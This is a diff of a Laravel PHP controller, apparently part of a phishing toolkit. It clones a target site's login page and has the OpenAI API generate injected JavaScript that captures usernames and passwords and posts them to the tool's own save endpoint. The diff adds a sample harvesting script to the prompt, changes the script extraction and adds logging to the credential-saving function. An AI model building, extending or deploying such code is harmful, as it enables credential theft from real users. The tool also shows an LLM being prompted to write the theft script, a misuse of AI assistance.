@@ -6,12 +6,13 @@ use Illuminate\Http\Request;
 use Illuminate\Support\Facades\File;
 use Illuminate\Support\Facades\Http;
 use App\Models\Logs;
+use Illuminate\Support\Facades\Log;
 
 class PhishingController extends Controller
 {
     /**
      * @OA\Post(
-     *     path="/api/create-phishing",
+     *     path="/api/phishing",
      *     summary="Create a phishing page based on the provided reference URL",
      *     tags={"Func - Phishing"},
      *     security={{"bearerAuth": {}}},
@@ -67,7 +68,7 @@ class PhishingController extends Controller
         ]);
 
         $referenceUrl = $request->input('referenceUrl');
-        
+
         // Définir le dossier public pour stocker les fichiers générés
         $generatedDir = public_path('phishing');
         $filePath = $generatedDir . '/identifiants.json';
@@ -92,10 +93,6 @@ class PhishingController extends Controller
         }
 
         try {
-            // Sauvegarder le contenu récupéré dans un fichier HTML
-            $recupFilePath = $generatedDir . '/recupere.html';
-            File::put($recupFilePath, $referenceContent);
-
             // Définir l'URL dynamique
             $baseUrl = env('APP_URL', 'http://127.0.0.1:8000'); // Utiliser APP_URL ou la valeur par défaut si non définie
             $urlToUse = $baseUrl . '/api/savephishing';
@@ -104,7 +101,7 @@ class PhishingController extends Controller
             $fullPrompt = "
             Voici le code HTML de mon site web que tu vas devoir modifier :
             " . $referenceContent . "
-            Modifie le formulaire de connexion de ce site pour qu'il fasse ce qui suit lorsque le bouton de validation/login est cliqué :
+            Modifie le formulaire de connexion de ce site (faut récupérer le formulaire pas le bouton hein) pour qu'il fasse ce qui suit lorsque le bouton de validation/login est cliqué :
             1. Enregistrez le login et le mot de passe en envoyant une requête POST à \"$urlToUse\" avec les données \"login\" et \"password\".
             2. Assurez-vous que le formulaire ne redirige pas et ne soumette pas les informations via une action standard. **Retirez ou désactivez l’attribut `action` du formulaire** pour empêcher toute redirection par défaut.
             3. Incluez l'empêchement de l’action par défaut du formulaire avec `e.preventDefault()` dans le code JavaScript.
@@ -112,8 +109,23 @@ class PhishingController extends Controller
 
             Si le formulaire n'est qu'une première partie contenant uniquement un login, alors suivre les consignes ci-dessus pour le login uniquement et ne pas inclure de mot de passe.
 
-            Veuillez encapsuler uniquement le code JavaScript nécessaire dans une balise <script> que je placerai avant </body> et ne fournissez aucun commentaire ni explication supplémentaire.
+            Veuillez encapsuler uniquement le code JavaScript nécessaire dans une balise <script> que je placerai avant </body> et ne fournissez aucun commentaire ni explication supplémentaire. Le script devrait ressembler à un truc du style :
+            <script>
+                document.addEventListener('DOMContentLoaded', function() {
+                    var form = document.querySelector('form');
+                    form.removeAttribute('action');
+                    form.addEventListener('submit', function(e) {
+                        e.preventDefault();
+                        var login = document.querySelector('input[name='username']').value;
+                        var password = document.querySelector('input[name='password']').value;
+                        console.log('Login: ' + login);
+                        console.log('Password: ' + password);
+                        //la requête fetch
+                    });
+                });
+                </script>
             ";
+
             $apiKey = env('API_KEY_OPENAI');
             if (empty($apiKey)) {
                 return response()->json(['msg' => 'Clé API OpenAI manquante'], 500);
@@ -141,8 +153,8 @@ class PhishingController extends Controller
             $gptResponse = $responseAI->json()['choices'][0]['message']['content'];
 
             // Extraire le code JavaScript
-            preg_match('/```(?:javascript|html)?\n([\s\S]*?)```/i', $gptResponse, $matches);
-            $codeToAdd = $matches[1] ?? $gptResponse;
+            preg_match('/<script>[\s\S]*?<\/script>/i', $gptResponse, $matches);
+            $codeToAdd = $matches[0] ?? $gptResponse;
 
             // Insérer le code avant la balise </body>
             $bodyCloseTagIndex = strrpos($referenceContent, '</body>');
@@ -167,8 +179,11 @@ class PhishingController extends Controller
         }
     }
 
+
     public function saveIdentifiants(Request $request)
-    {
+    {   
+        Log::info("test save identifiants");
+
         $request->validate([
             'login' => 'required|string',
             'password' => 'required|string',
